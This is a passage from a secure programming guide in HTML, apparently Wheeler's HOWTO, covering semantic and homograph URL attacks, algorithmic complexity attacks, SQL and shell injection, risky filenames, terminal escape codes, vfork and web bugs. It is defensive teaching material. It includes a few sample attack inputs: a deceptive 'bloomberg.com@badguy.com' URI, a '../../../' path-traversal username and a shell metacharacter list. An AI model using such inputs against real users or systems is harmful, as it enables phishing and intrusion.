For example, the attacker may try to convince the user that they&#8217;re
looking at a trusted website, even if they aren&#8217;t.</P
><P
>Semantic attacks are difficult to counter, because they&#8217;re exploiting
the correct operation of the computer.
The way to deal with semantic attacks is to help give the human
additional information, so that when <SPAN
CLASS="QUOTE"
>&#8220;odd&#8221;</SPAN
> things happen the human
will have more information or a warning will be presented
that something may not be what it appears to be.</P
><P
>One example is URIs that, while legitimate, may fool users into
thinking they have a different meaning.
For example, look at this URI:
<TABLE
BORDER="0"
BGCOLOR="#E0E0E0"
WIDTH="100%"
><TR
><TD
><FONT
COLOR="#000000"
><PRE
CLASS="PROGRAMLISTING"
>  http://www.bloomberg.com@www.badguy.com</PRE
></FONT
></TD
></TR
></TABLE
>
If a user clicked on that URI, they might think that they&#8217;re going
to Bloomberg (who provide financial commodities news), but instead
they&#8217;re going to www.badguy.com (and providing the username
www.bloomberg.com, which www.badguy.com will conveniently ignore).
If the badguy.com website then imitated the bloomberg.com site,
a user might be convinced that they&#8217;re seeing the real thing
(and make investment decisions based on attacker-controlled
information).
This depends on URIs being used in an unusual way - clickable URIs
can have usernames, but usually don&#8217;t.
One solution for this case is for the web browser to detect such unusual
URIs and create a pop-up confirmation widget, saying
<SPAN
CLASS="QUOTE"
>&#8220;You are about to log into www.badguy.com as user www.bloomberg.com;
do you wish to proceed?&#8221;</SPAN
>
If the widget allows the user to change these entries, it provides
additional functionality to the user as well as providing protection
against that attack.</P
><P
>Another example is homographs, particularly international homographs.
Certain letters look similar to each other, and these can be exploited
as well.
For example, since 0 (zero) and O (the letter O) look similar to each
other, users may not realize that WWW.BLOOMBERG.COM and WWW.BL00MBERG.COM
are different web addresses.
Other similar-looking letters include 1 (one) and l (lower-case L).
If international characters are allowed, the situation is worse.
For example, many Cyrillic letters look essentially the same as
Roman letters, but the computer will treat them differently.
Currently most systems don&#8217;t allow international characters in host names,
but for various good reasons it&#8217;s widely agreed that support for them
will be necessary in the future.
One proposed solution has been to diplay letters from different code regions
using different colors - that way,
users get more information visually.
If the users look at URI, they will hopefully notice the strange coloring.
[Gabrilovich 2002]
The page
<A
HREF="http://www.gerv.net/security/phishing-browser-defences.html"
TARGET="_top"
>Phishing - Browser-based Defences</A
>
provides another set of possible defenses against this attack.
However, this does show the essence of a semantic attack -
it&#8217;s difficult to defend against, precisely because the computers are
working correctly.</P
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="CAREFUL-TYPING"
>7.18. Be Careful with Data Types</A
></H2
><P
>Be careful with the data types used, in particular those used in
interfaces.
For example, <SPAN
CLASS="QUOTE"
>&#8220;signed&#8221;</SPAN
> and <SPAN
CLASS="QUOTE"
>&#8220;unsigned&#8221;</SPAN
> values are treated differently
in many languages (such as C or C++).</P
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="COMPLEXITY-ATTACKS"
>7.19. Avoid Algorithmic Complexity Attacks</A
></H2
><P
>If it&#8217;s important that your system keep working
(and not be vulnerable to denial-of-service attacks), then it needs
to be designed so it&#8217;s not vulnerable to
<SPAN
CLASS="QUOTE"
>&#8220;Algorithmic Complexity Attacks&#8221;</SPAN
>.
These attacks exploit the difference between <SPAN
CLASS="QUOTE"
>&#8220;typical case&#8221;</SPAN
>
behavior versus worst-case behavior; they intentionally send data that
causes an algorithm to consistently display worst-case behavior.
For examples, hash tables usually have O(1) performance for all operations,
but in many implementations an attacker can
construct input so a large number of <SPAN
CLASS="QUOTE"
>&#8220;hash collisions&#8221;</SPAN
> occur.
Other common algorithms that can be attacked include sorting
routines (e.g., quicksort&#8217;s worst case is O(n^2) instead of O(n log n))
and regular expression implementations.
Many higher-level capabilities are built on these basic algorithms
(e.g., many searches use hash tables).
More information about this attack is available in
Crosby and Wallach&#8217;s paper on the subject [Crosby 2003].
See also the discussion about Regular Expression Denial Of Service (REDoS)
attacks in <A
HREF="#REGEX-REDOS"
>Section 5.2.3</A
>.</P
><P
>There are several solutions.
One approach is to choose
algorithms with the best worst-case behavior, not just the
best average-case behavior;
many real-time algorithms are specially designed to have the best
worst-case behavior, so search for those versions.
Crosby and Wallach propose a <SPAN
CLASS="QUOTE"
>&#8220;universal hashing library&#8221;</SPAN
>
hash function
that avoids this problem.
Although I&#8217;ve seen no proof that they'd work, trivially keyed
hashes (where what is to be hashed is first passed
through a random local key) should be effective, and cryptographically
keyed hashes should be very effective - just make sure the attacker
can&#8217;t determine the key.
Judy trees may be an effective alternative to b-trees.</P
></DIV
></DIV
><DIV
CLASS="CHAPTER"
><HR><H1
><A
NAME="CALL-OUT"
></A
>Chapter 8. Carefully Call Out to Other Resources</H1
><TABLE
BORDER="0"
WIDTH="100%"
CELLSPACING="0"
CELLPADDING="0"
CLASS="EPIGRAPH"
><TR
><TD
WIDTH="45%"
>&nbsp;</TD
><TD
WIDTH="45%"
ALIGN="LEFT"
VALIGN="TOP"
><I
><P
><I
>Do not put your trust in princes, in mortal men, who cannot save.</I
></P
></I
></TD
></TR
><TR
><TD
WIDTH="45%"
>&nbsp;</TD
><TD
WIDTH="45%"
ALIGN="RIGHT"
VALIGN="TOP"
><I
><SPAN
CLASS="ATTRIBUTION"
>Psalms 146:3 (NIV)</SPAN
></I
></TD
></TR
></TABLE
><P
>Practically no program is truly self-contained; nearly all programs
call out to other programs for resources, such as programs provided
by the operating system, software libraries, and so on.
Sometimes this calling out to other resources isn&#8217;t obvious or involves
a great deal of <SPAN
CLASS="QUOTE"
>&#8220;hidden&#8221;</SPAN
> infrastructure which must be depended on,
e.g., the mechanisms to implement dynamic libraries.
Clearly, you must be careful about what other resources your program trusts
and you must make sure that the way you send requests to them.</P
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="CALL-ONLY-SAFE"
>8.1. Call Only Safe Library Routines</A
></H2
><P
>Sometimes there is a conflict between security and the development
principles of abstraction (information hiding) and reuse.
The problem is that some high-level library routines
may or may not be implemented securely,
and their specifications won&#8217;t tell you.
Even if a particular implementation is secure, it may not be
possible to ensure that other versions of the routine
will be safe, or that the same interface will be safe on other platforms.&#13;</P
><P
>In the end, if your application must be secure, you must sometimes
re-implement your own versions of library routines.
Basically, you have to re-implement routines if you can&#8217;t be sure
that the library routines will perform the necessary actions you require
for security.
Yes, in some cases the library&#8217;s implementation should be fixed, but
it&#8217;s your users who will be hurt if you choose a library routine that
is a security weakness.
If can, try to use the high-level interfaces when you must
re-implement something - that way, you can switch to the high-level
interface on systems where its use is secure.</P
><P
>If you can, test to see if the routine is secure or not, and use it if
it&#8217;s secure - ideally you can perform this test as part of
compilation or installation (e.g., as part of an <SPAN
CLASS="QUOTE"
>&#8220;autoconf&#8221;</SPAN
> script).
For some conditions this kind of run-time testing is impractical, but
for other conditions, this can eliminate many problems.
If you don&#8217;t want to bother to re-implement the library, at least test
to make sure it&#8217;s safe and halt installation if it isn&#8217;t.
That way, users will not accidentally install an insecure program and
will know what the problem is.</P
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="LIMIT-CALL-OUTS"
>8.2. Limit Call-outs to Valid Values</A
></H2
><P
>Ensure that any call out to another program only permits valid
and expected values for every parameter.
This is more difficult than it sounds, because many
library calls or commands call lower-level routines in potentially
surprising ways.
For example, many system calls are implemented indirectly by
calling the shell, which means that passing characters which are shell
metacharacters can have dangerous effects.
So, let&#8217;s discuss metacharacters.</P
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="HANDLE-METACHARACTERS"
>8.3. Handle Metacharacters</A
></H2
><P
>Many systems, such as SQL interpreters and the command line shell,
have <EM
>metacharacters</EM
>,
that is, characters in their input that are not interpreted as data.
Such characters might commands, or delimit data from commands or other data.
If there&#8217;s a language specification for that system&#8217;s interface
that you&#8217;re using, then it certainly has metacharacters.
If your program invokes those other systems and allows attackers to
insert such metacharacters, the usual result is that an attacker can
completely control your program.</P
><DIV
CLASS="SECT2"
><HR><H3
CLASS="SECT2"
><A
NAME="SQL-INJECTION"
>8.3.1. SQL injection</A
></H3
><P
>Most database systems include a language that can let you
create arbitrary queries, and typically many other functions too.
The SQL language is especially common, and many other languages for databases
are similar to the SQL language.</P
><P
>SQL and its related languages, unsurprisingly, include metacharacters.
When metacharacters are provided as input to trigger SQL metacharacters,
it&#8217;s often called
<EM
>SQL injection</EM
>.
Even if the language is technically not SQL, if it's an
attack on a language for a database system it's typically still
called a SQL injection attack.
There are many ways to trigger SQL injection attacks; attackers
can insert single or double quotes, semicolons (which act as command
separators), "--" which is a comment token, and so on.
See
<A
HREF="http://www.spidynamics.com/papers/SQLInjectionWhitePaper.pdf"
TARGET="_top"
>SPI Dynamic&#8217;s paper <SPAN
CLASS="QUOTE"
>&#8220;SQL Injection: Are your Web Applications Vulnerable?&#8221;</SPAN
></A
>
for further discussion on this.</P
><P
>Perhaps the best single approach for countering SQL injection are
prepared statements.
Prepared statement allow programmers to identify placeholders;
a pre-exisitng library then escapes it properly for that specific
implementation.
This approach has many advantages.
First, since the library does the escaping for you,
it is  simpler and more likely to get right.
Second, it tends to produce easier-to-maintain code, since the code
tends to be easier to read.
Prepared statements are especially important when dealing with SQL,
because different SQL engines have different syntax rules.</P
><P
>There are other approaches, of course.
You can write your own escape code, but this is difficult to get correct,
and typically a waste of time since there are usually existing libraries
to do the job.
You can also use stored procedures, which can also help prevent SQL injection.</P
><P
>There are other solutions that limit inputs.
Different SQL implementations have different metacharacters, so blacklisting
is even more a bad idea for countering SQL injection.
As discussed in <A
HREF="#INPUT"
>Chapter 5</A
>,
define a very limited pattern and only allow data matching that
pattern to enter; if you limit your pattern to ^[0-9]$ or
^[0-9A-Za-z]*$ then you won&#8217;t have a problem.
If you must handle data that may include SQL metacharacters, a good approach
is to convert it (as early as possible) to some other encoding before
storage, e.g.,
HTML encoding (in which case you&#8217;ll need to encode any ampersand characters
too).
Also, prepend and append a quote to all user input, even
if the data is numeric; that way, insertions of white space and other
kinds of data won&#8217;t be as dangerous.</P
></DIV
><DIV
CLASS="SECT2"
><HR><H3
CLASS="SECT2"
><A
NAME="SHELL-INJECTION"
>8.3.2. Shell injection</A
></H3
><P
>Many metacharacter problems involve shell metacharacters.
An attack that tries to exploit a vulnerabliity in shell metacharacter
processing is called a
<EM
>shell injection</EM
> attack.
For example, the standard Unix-like command shell
(typically stored in /bin/sh)
interprets a number of characters specially.
If these characters are sent to the shell, then their special interpretation
will be used unless escaped; this fact can be used to break programs.
According to the WWW Security FAQ [Stein 1999, Q37], these metacharacters are:

<TABLE
BORDER="1"
BGCOLOR="#E0E0E0"
WIDTH="100%"
><TR
><TD
><FONT
COLOR="#000000"
><PRE
CLASS="SCREEN"
>&#38; ; ` ' \ " | * ? ~ &#60; &#62; ^ ( ) [ ] { } $ \n \r</PRE
></FONT
></TD
></TR
></TABLE
></P
><P
>The # character is a comment character, and thus is also a metacharacter.
The separator values can be changed by setting the IFS environment
variable, but if you can&#8217;t trust the source of this variable you should
have thrown it out or reset it anyway as part of your environment
variable processing.</P
><P
>Unfortunately, in real life this isn&#8217;t a complete list.
Here are some other characters that can be problematic:
<P
></P
><UL
><LI
><P
>'!' means <SPAN
CLASS="QUOTE"
>&#8220;not&#8221;</SPAN
> in an expression (as it does in C);
    if the return value of a program is tested, prepending !
    could fool a script into thinking something had failed when it
    succeeded or vice versa.
    In some shells, the "!" also accesses the command history, which can
    cause real problems.
    In bash, this only occurs for interactive mode, but tcsh
    (a csh clone found in some Linux distributions) uses "!" even in scripts.</P
></LI
><LI
><P
>'#' is the comment character; all further text on the line is ignored.</P
></LI
><LI
><P
>'-' can be misinterpreted as leading an option (or, as --, disabling
all further options).  Even if it&#8217;s in the <SPAN
CLASS="QUOTE"
>&#8220;middle&#8221;</SPAN
> of a filename,
if it&#8217;s preceded by what the shell considers as whitespace you may
have a problem.</P
></LI
><LI
><P
>' ' (space), '\t' (tab), '\n' (newline), '\r' (return),
'\v' (vertical space), '\f' (form feed),
and other whitespace characters can have many dangerous effects.
They can may turn a <SPAN
CLASS="QUOTE"
>&#8220;single&#8221;</SPAN
> filename into multiple arguments, for example,
or turn a single parameter into multiple parameter when stored.
Newline and return have a number of additional dangers, for example,
they can be used to create <SPAN
CLASS="QUOTE"
>&#8220;spoofed&#8221;</SPAN
> log entries in some programs,
or inserted just before a separate command that is then executed
(if an underlying protocol uses newlines or returns as command
separators).</P
></LI
><LI
><P
>Other control characters (in particular, NIL) may cause problems for
some shell implementations.</P
></LI
><LI
><P
>Depending on your usage, it&#8217;s even conceivable that <SPAN
CLASS="QUOTE"
>&#8220;.&#8221;</SPAN
>
(the <SPAN
CLASS="QUOTE"
>&#8220;run in current shell&#8221;</SPAN
>) and <SPAN
CLASS="QUOTE"
>&#8220;=&#8221;</SPAN
> (for setting variables) might
be worrisome characters.
However, any example I&#8217;ve found so far where these
are issues have other (much worse) security problems.</P
></LI
></UL
>&#13;</P
><P
>Forgetting one of these characters can be disastrous, for example,
many programs omit backslash as a shell metacharacter [rfp 1999].
As discussed in the <A
HREF="#INPUT"
>Chapter 5</A
>, a recommended approach
by some
is to immediately escape at least all of these characters when they are input.</P
><P
>So simply creating a list of characters that are forbidden is a bad
idea (because that is a <EM
>blacklist</EM
>).
Instead, identify the characters that are acceptable, and then
forbid or correctly escape all others (a <EM
>whitelist</EM
>).</P
><P
>What makes the shell metacharacters particularly pervasive is
that several important library calls, such as popen(3) and system(3),
are implemented by calling the command shell, meaning that they will
be affected by shell metacharacters too.
Similarly, execlp(3) and execvp(3) may cause the shell to be called.
Many guidelines suggest avoiding popen(3), system(3), execlp(3), and execvp(3)
entirely and use execve(3) directly in C when trying to spawn
a process [Galvin 1998b].
At the least, avoid using system(3) when you can use the execve(3);
since system(3) uses the shell to expand characters, there is more
opportunity for mischief in system(3).
In a similar manner the Perl and shell backtick (`) also call a command shell;
for more information on Perl see <A
HREF="#PERL"
>Section 10.2</A
>.</P
></DIV
><DIV
CLASS="SECT2"
><HR><H3
CLASS="SECT2"
><A
NAME="FILENAMES"
>8.3.3. Problematic pathnames and filenames</A
></H3
><P
>A "pathname" is a sequence of bytes that describes how to find
a file system object.
On Unix-like systems, a pathname is a sequence of one or more filenames
separated by one or more "/".
On Windows systems a pathname is more complicated but the idea is the same.
In practice, many people use the term "filename" to refer to pathnames.</P
><P
>Unfortunately,
pathnames are often at least partly controlled by an untrusted user.
For example, it is often useful to use file/directory
names as a key to identify relevant data, but this can lead
to untrusted users controlling filenames.
Another example is when monitoring or managing of shared systems
(e.g., virtual machines or containerized filesystems);
in this case an untrusted monitoree controls filenames.
Even when an attacker should not be able to gain this kind of control,
it is often important to counter this kind of problem as a defense-in-depth
measure, to counter attackers who gain a small amount of control.</P
><P
>An obvious case is that systems are not supposed to allow
redirection outside of some direction (e.g., a "document root"
of a web server).
If a web application allowed ".", "/", and/or "\", it might be
easy to foil that rule.
For example, if a program tries to access a path that is a
concatentation of "trusted_root_path" and "username", the attacker
might be able to create a username "../../../mysecrets"
and foil the limitations.
As always, use a very limited whitelist for information that will be
used to create filenames.</P
><P
>Microsoft Windows pathnames can be difficult to deal with securely.
Windows pathname interpretations vary depending on
the version of Windows and the API used
(many calls use CreateFile which supports \\.\ - and these interpret
pathnames differently than the other calls that do not).
Perhaps most obviously, "letter:" and "\\server\share..."
have a special meaning in Windows.
A nastier issue is that there are reserved filenames,
whose form depend on the API used and the local configuration.
The built-in reserved device names are as follows:
CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, and LPT9.
Even worse, drivers can create more reserved names - so you actually
cannot know ahead-of-time what names are reserved.
You should avoid creating filenames with reserved names, both
with and without an extension;
if attacker can trick the program into reading/writing the name
(e.g., com1.txt), it may (depending on API) cause read or write to a device
instead of a file.
In this case, even simple alphanumerics can cause disaster and be
interpreted as metacharacters - this is a rare situation, since usually
alphanumerics are safe.
Windows supports "/" as a directory separator, but it conventionally
uses "\" as the directory separator (which is annoying because
\ is widely used as an escape character).
In Windows,
don't end a file or directory name with a space or period;
the underlying file system may support it, but the
Windows shell and user interface generally do not.
More info is available at
<A
HREF="http://msdn.microsoft.com/en-us/library/aa365247.aspx"
TARGET="_top"
>http://msdn.microsoft.com/en-us/library/aa365247.aspx</A
>.</P
><P
>Filenames and pathnames on Unix-like systems are not always easy to
deal with either.
On most Unix-like systems, a filename can be any sequence of bytes
that does not include \0 (the terminator) or slash.
One common misconception is that Unix filenames are a string of characters.
Unix filenames are not a string of one or more characters;
they are merely a sequence of bytes, so a filename
does not need to be a legal sequence of characters.
For example, while it's a common convention to interpret filenames
as a UTF-8 encoding of characters, most systems do not actually enforce this.
Indeed, they tend to enforce nothing, so many problematic filenames
can be created, including filenames with spaces (or only spaces),
control characters (including newline, tab, escape, etc.), bytes
that are not legal UTF-8, or including a leading "-"
(the marker for command options).
These problematic filenames can cause trouble later.
Some potential problems with filenames are specific to the shell, but
filename problems are not limited to the shell.</P
><P
>A common problem is that "-" is the option flag on many commands, but it is a
legal beginning of a filename.
A simple solution is to prefix all globs or filenames where needed with "./"
so that they cannot begin with "-".
So for example, never use "*.pdf" to refer to a set of PDFs; use "./*.pdf".</P
><P
>Be careful about displaying or storing pathnames, since they can include
newlines, tabs, escape (which can begin terminal controls), or sequences
that are not legal strings.
On some systems, merely displaying filenames can invoke terminal controls,
which can then run commands with the privilege of the one displaying.</P
><P
>For more detailed information, see
<A
HREF="http://www.dwheeler.com/essays/filenames-in-shell.html"
TARGET="_top"
>Filenames and Pathnames in Shell: How to do it correctly</A
>.</P
></DIV
><DIV
CLASS="SECT2"
><HR><H3
CLASS="SECT2"
><A
NAME="OTHER-INJECTION"
>8.3.4. Other injection issues</A
></H3
><P
>A number of programs, especially those designed for human interaction,
have <SPAN
CLASS="QUOTE"
>&#8220;escape&#8221;</SPAN
> codes that perform <SPAN
CLASS="QUOTE"
>&#8220;extra&#8221;</SPAN
> activities.
One of the more common (and dangerous) escape codes is one that brings
up a command line.
Make sure that these <SPAN
CLASS="QUOTE"
>&#8220;escape&#8221;</SPAN
> commands can&#8217;t be included
(unless you&#8217;re sure that the specific command is safe).
For example, many line-oriented mail programs (such as mail or mailx) use
tilde (~) as an escape character, which can then be used to send a number
of commands.
As a result, apparently-innocent commands such as
<SPAN
CLASS="QUOTE"
>&#8220;mail admin &#60; file-from-user&#8221;</SPAN
> can be used to execute arbitrary programs.
Interactive programs such as vi, emacs, and ed have <SPAN
CLASS="QUOTE"
>&#8220;escape&#8221;</SPAN
> mechanisms
that allow users to run arbitrary shell commands from their session.
Always examine the documentation of programs you call to search for
escape mechanisms.
It&#8217;s best if you call only programs intended for use by other programs; see
<A
HREF="#CALL-INTENTIONAL-APIS"
>Section 8.4</A
>.</P
><P
>The issue of avoiding
escape codes even goes down to low-level hardware components
and emulators of them.
Most modems implement the so-called <SPAN
CLASS="QUOTE"
>&#8220;Hayes&#8221;</SPAN
> command set.
Unless the command set is disabled, inducing
a delay, the phrase <SPAN
CLASS="QUOTE"
>&#8220;+++&#8221;</SPAN
>, and then another delay forces the modem
to interpret any following text as commands to the modem instead.
This can be used to implement denial-of-service attacks (by
sending <SPAN
CLASS="QUOTE"
>&#8220;ATH0&#8221;</SPAN
>, a hang-up command) or even forcing
a user to connect to someone else (a sophisticated attacker could
re-route a user&#8217;s connection through a machine under the attacker&#8217;s control).
For the specific case of modems, this is easy to counter
(e.g., add "ATS2-255" in the modem initialization string), but the
general issue still holds: if you&#8217;re controlling a lower-level component,
or an emulation of one, make sure that you disable or otherwise handle
any escape codes built into them.</P
><P
>Many <SPAN
CLASS="QUOTE"
>&#8220;terminal&#8221;</SPAN
> interfaces implement the escape
codes of ancient, long-gone physical terminals like the VT100.
These codes can be useful, for example, for bolding characters,
changing font color, or moving to a particular location
in a terminal interface.
However, do not allow arbitrary untrusted data to be sent directly
to a terminal screen, because some of those codes can cause serious problems.
On some systems you can remap keys (e.g., so when a user presses
"Enter" or a function key it sends the command you want them to run).
On some you can even send codes to
clear the screen, display a set of commands you&#8217;d like the victim to run,
and then send that set <SPAN
CLASS="QUOTE"
>&#8220;back&#8221;</SPAN
>, forcing the victim to run
the commands of the attacker&#8217;s choosing without even waiting for a keystroke.
This is typically implemented using <SPAN
CLASS="QUOTE"
>&#8220;page-mode buffering&#8221;</SPAN
>.
This security problem is why emulated tty&#8217;s (represented as device files,
usually in /dev/) should only be writeable by
their owners and never anyone else - they should never have
<SPAN
CLASS="QUOTE"
>&#8220;other write&#8221;</SPAN
> permission set, and unless only the user is a member of
the group (i.e., the <SPAN
CLASS="QUOTE"
>&#8220;user-private group&#8221;</SPAN
> scheme), the <SPAN
CLASS="QUOTE"
>&#8220;group write&#8221;</SPAN
>
permission should not be set either for the terminal [Filipski 1986].
If you&#8217;re displaying data to the user at a (simulated) terminal, you probably
need to filter out all control characters (characters with values less
than 32) from data sent back to
the user unless they&#8217;re identified by you as safe.
Worse comes to worse, you can identify tab and newline (and maybe
carriage return) as safe, removing all the rest.
Characters with their high bits set (i.e., values greater than 127)
are in some ways trickier to handle; some old systems implement them as
if they weren&#8217;t set, but simply filtering them inhibits much international
use.
In this case, you need to look at the specifics of your situation.</P
><P
>A related problem is that the NIL character (character 0) can have
surprising effects.
Most C and C++ functions assume
that this character marks the end of a string, but string-handling routines
in other languages (such as Perl and Ada95) can handle strings containing NIL.
Since many libraries and kernel calls use the C convention, the result
is that what is checked is not what is actually used [rfp 1999].</P
><P
>When calling another program or referring to a file
it may be wise to specify its full path
(e.g, <TT
CLASS="FILENAME"
>/usr/bin/sort</TT
>).
For program calls,
this will eliminate possible errors in calling the <SPAN
CLASS="QUOTE"
>&#8220;wrong&#8221;</SPAN
> command,
even if the PATH value is incorrectly set.
For other file referents, this reduces problems from <SPAN
CLASS="QUOTE"
>&#8220;bad&#8221;</SPAN
> starting
directories.</P
></DIV
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="CALL-INTENTIONAL-APIS"
>8.4. Call Only Interfaces Intended for Programmers</A
></H2
><P
>Call only application programming interfaces (APIs) that are
intended for use by programs.
Usually a program can invoke any other program,
including those that are really designed for human interaction.
However, it&#8217;s usually unwise to invoke a program intended for human
interaction in the same way a human would.
The problem is that programs&#8217;s human interfaces are intentionally rich
in functionality and are often difficult to completely control.
As discussed in <A
HREF="#HANDLE-METACHARACTERS"
>Section 8.3</A
>,
interactive programs often have <SPAN
CLASS="QUOTE"
>&#8220;escape&#8221;</SPAN
> codes,
which might enable an attacker to perform undesirable functions.
Also, interactive programs often try to intuit the <SPAN
CLASS="QUOTE"
>&#8220;most likely&#8221;</SPAN
> defaults;
this may not be the default you were expecting, and an attacker may find
a way to exploit this.</P
><P
>Examples of programs you shouldn&#8217;t normally call directly include
mail, mailx, ed, vi, and emacs.
At the very least, don&#8217;t call these without checking
their input first.</P
><P
>Usually there are parameters to give you safer access to the program&#8217;s
functionality,
or a different API or application that&#8217;s intended for use by programs;
use those instead.
For example, instead of invoking a text editor to edit some text
(such as ed, vi, or emacs), use sed where you can.</P
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="CHECK-RETURNS"
>8.5. Check All System Call Returns</A
></H2
><P
>Every system call that can return an error condition must have that
error condition checked.
One reason is that nearly all system calls require limited system resources,
and users can often affect resources in a variety of ways.
Setuid/setgid programs can have limits set on them through calls such as
setrlimit(3) and nice(2).
External users of server programs and CGI scripts
may be able to cause resource exhaustion simply by making a large number
of simultaneous requests.
If the error cannot be handled gracefully, then fail safe as discussed earlier.</P
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="AVOID-VFORK"
>8.6. Avoid Using vfork(2)</A
></H2
><P
>The portable way to create new processes in Unix-like systems
is to use the fork(2) call.
BSD introduced a variant called vfork(2) as an optimization technique.
In vfork(2), unlike fork(2),  the child borrows the parent&#8217;s memory
and thread of control until a call to execve(2V) or an exit occurs;
the parent process is suspended while the child is using its resources.
The rationale is that in old BSD systems, fork(2) would actually cause
memory to be copied while vfork(2) would not.
Linux never had this problem; because Linux used copy-on-write
semantics internally, Linux only copies pages when they changed
(actually, there are still some tables that have to be copied; in most
circumstances their overhead is not significant).
Nevertheless, since some programs depend on vfork(2),
recently Linux implemented the BSD vfork(2) semantics
(previously vfork(2) had been an alias for fork(2)).</P
><P
>There are a number of problems with vfork(2).
From a portability point-of-view,
the problem with vfork(2) is that it&#8217;s actually fairly tricky for a
process to not interfere with its parent, especially in high-level languages.
The <SPAN
CLASS="QUOTE"
>&#8220;not interfering&#8221;</SPAN
> requirement applies to the actual machine code
generated, and many compilers generate hidden temporaries and other
code structures that cause unintended interference.
The result: programs using vfork(2) can easily fail when the code changes
or even when compiler versions change.</P
><P
>For secure programs it gets worse on Linux systems, because
Linux (at least 2.2 versions through 2.2.17) is vulnerable to a
race condition in vfork()&#8217;s implementation.
If a privileged process uses a vfork(2)/execve(2) pair in Linux
to execute user commands, there&#8217;s a race condition
while the child process is already running as the user&#8217;s
UID, but hasn`t entered execve(2) yet.
The user may be able to send signals, including SIGSTOP, to this process.
Due to the semantics of
vfork(2), the privileged parent process would then be blocked as well.
As a result, an unprivileged process could cause the privileged process
to halt, resulting in a denial-of-service
of the privileged process&#8217; service.
FreeBSD and OpenBSD, at least, have code to specifically deal with this
case, so to my knowledge they are not vulnerable to this problem.
My thanks to Solar Designer, who noted and documented this
problem in Linux on the <SPAN
CLASS="QUOTE"
>&#8220;security-audit&#8221;</SPAN
> mailing list on October 7, 2000.</P
><P
>The bottom line with vfork(2) is simple:
<EM
>don&#8217;t</EM
> use vfork(2) in your programs.
This shouldn&#8217;t be difficult; the primary use of vfork(2) is to support old
programs that needed vfork&#8217;s semantics.</P
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="EMBEDDED-CONTENT-BUGS"
>8.7. Counter Web Bugs When Retrieving Embedded Content</A
></H2
><P
>Some data formats can embed references to content that is automatically
retrieved when the data is viewed (not waiting for a user to select it).
If it&#8217;s possible to cause this data to be retrieved through the
Internet (e.g., through the World Wide Wide), then there is a
potential to use this capability to obtain information about readers
without the readers&#8217; knowledge, and in some cases to force the reader
to perform activities without the reader&#8217;s consent.
This privacy concern is sometimes called a <SPAN
CLASS="QUOTE"
>&#8220;web bug.&#8221;</SPAN
></P
><P
>In a web bug, a reference is intentionally inserted into a document
and used by the content author to track
who, where, and how often a document is read.
The author can also essentially watch how a <SPAN
CLASS="QUOTE"
>&#8220;bugged&#8221;</SPAN
> document
is passed from one person to another or from one organization to another. </P
><P
>The HTML format has had this issue for some time.
According to the
<A
HREF="http://www.privacyfoundation.org"
TARGET="_top"
>Privacy Foundation</A
>:
<A
NAME="AEN2438"
></A
><BLOCKQUOTE
CLASS="BLOCKQUOTE"
><P
>Web bugs are used extensively today by Internet
advertising companies on Web pages and
in HTML-based email messages for tracking.
They are typically 1-by-1 pixel in size to make them
invisible on the screen to disguise the fact that they are used for tracking.
However, they could be any image (using the img tag);
other HTML tags that can implement web bugs, e.g., frames,
form invocations, and scripts.
By itself, invoking the web bug will provide the <SPAN
CLASS="QUOTE"
>&#8220;bugging&#8221;</SPAN
> site the
reader IP address, the page that the reader visited, and various information
about the browser; by also using cookies it&#8217;s often possible to determine
the specific identify of the reader.
A survey about web bugs is available at
<A
HREF="http://www.securityspace.com/s_survey/data/man.200102/webbug.html"
TARGET="_top"
>http://www.securityspace.com/s_survey/data/man.200102/webbug.html</A
>.</P
></BLOCKQUOTE
></P
><P
>What is more concerning is that other document formats seem to have
such a capability, too.
When viewing HTML from a web site with a web browser, there are other
ways of getting information on who is browsing the data, but when
viewing a document in another format from an email few users expect
that the mere act of reading the document can be monitored.
However, for many formats, reading a document can be monitored.
For example, it has been recently determined that Microsoft Word can
support web bugs;
see
<A
HREF="http://www.privacyfoundation.org/advisories/advWordBugs.html"
TARGET="_top"
>the Privacy Foundation advisory for more information </A
>.
As noted in their advisory,
recent versions of Microsoft Excel and Microsoft Power Point can also
be bugged.
In some cases, cookies can be used to obtain even more information.</P
><P
>Web bugs are primarily an issue with the design of the file format.
If your users value their privacy, you probably will want to limit the
automatic downloading of included files.
One exception might be when the file itself is being downloaded
(say, via a web browser); downloading other files from the same location
at the same time is much less likely to concern users.</P
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="HIDE-SENSITIVE-INFORMATION"
>8.8. Hide Sensitive Information</A
></H2
><P
>Sensitive information should be hidden from prying eyes, both while
being input and output, and when stored in the system.
Sensitive information certainly includes credit card numbers,
account balances, and home addresses, and in many applications
also includes names, email addressees, and other private information.</P
><P
>Web-based applications should encrypt all communication with a user
that includes sensitive information; the usual way is to use the
"https:" protocol (HTTP on top of SSL or TLS).
According to the HTTP 1.1 specification (IETF RFC 2616 section 15.1.3),
authors of services which use the HTTP protocol <EM
>should not</EM
>
use GET based forms for the submission of sensitive data,
because this will cause this data to be encoded in the Request-URI.
Many existing servers, proxies, and user agents will log
the request URI in some place where it might be visible to third parties.
Instead, use POST-based submissions, which are intended for
this purpose.</P
><P
>Databases of such sensitive data should also be encrypted on any storage
device (such as files on a disk).
Such encryption doesn&#8217;t protect against an attacker breaking the secure
application, of course, since obviously the application
has to have a way to access the encrypted data too.
However, it <EM
>does</EM
> provide some defense against
attackers who manage to get backup disks of the data
but not of the keys used to decrypt them.
It also provides some defense if an attacker doesn&#8217;t manage to break
into an application, but does manage to partially break into a related
system just enough to view the stored data - again, they now have to
break the encryption algorithm to get the data.
There are many circumstances where data can be transferred unintentionally
(e.g., core files), which this also prevents.
